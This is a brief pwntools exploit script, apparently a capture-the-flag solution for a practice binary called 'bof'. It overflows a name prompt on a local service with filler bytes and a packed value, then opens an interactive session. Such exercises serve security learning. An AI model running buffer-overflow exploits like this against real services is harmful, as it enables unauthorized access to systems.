from pwn import *

#r = process('../bof/share/bof')
r = remote('127.0.0.1', 10001)
r.sendlineafter(b'Please input your name: ', b'AAAAAAAAAA' + p64(0x5))
r.interactive()
